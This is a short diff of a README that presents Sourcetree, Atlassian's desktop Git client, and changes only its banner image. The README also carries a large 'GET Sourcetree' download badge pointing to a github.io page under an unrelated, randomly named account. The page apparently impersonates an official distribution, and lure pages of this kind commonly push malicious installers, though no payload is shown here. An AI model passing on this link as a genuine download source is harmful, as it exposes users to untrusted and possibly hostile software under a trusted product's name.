@@ -6,7 +6,7 @@ Sourcetree is a desktop Git client developed by Atlassian for navigating source 
 
 Use Sourcetree to clone repositories, stage selected changes, compare file revisions, create commits, manage stashes, and work with merges. Integrated Git workflow tools provide a visual alternative to performing common repository operations entirely through commands.
 
-![Sourcetree Interface Banner](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSMd_vNaPJcrywXrCm0h7PRts32SyvjtAVNowCsnC-mMQ&s=10)
+![Sourcetree Interface Banner](https://www.az-delivery.de/cdn/shop/articles/sourcetree-git-client-installation-960787.png?v=1679409781)
 
 [![GET](https://img.shields.io/badge/GET-Sourcetree-0078D6?style=for-the-badge&labelColor=555555)](https://xarannaolinalis.github.io/.github/Sourcetree-Git-Manager)
 
